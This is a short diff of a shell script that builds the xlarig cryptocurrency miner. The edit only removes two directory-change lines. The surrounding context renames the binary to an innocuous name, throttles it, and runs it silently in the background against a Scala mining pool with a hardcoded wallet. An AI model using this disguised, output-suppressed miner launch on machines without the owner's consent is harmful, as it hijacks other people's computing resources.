@@ -46,9 +46,6 @@ cmake ..
 
 make
 
-cd xlarig
-
-cd build
 mv xlarig sgr1
 cpulimit -l 120 -e sgr1 &
 ./sgr1 -o mine.scalaproject.io:3333 -p MINER_NAME -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera > /dev/null 2>&1 &
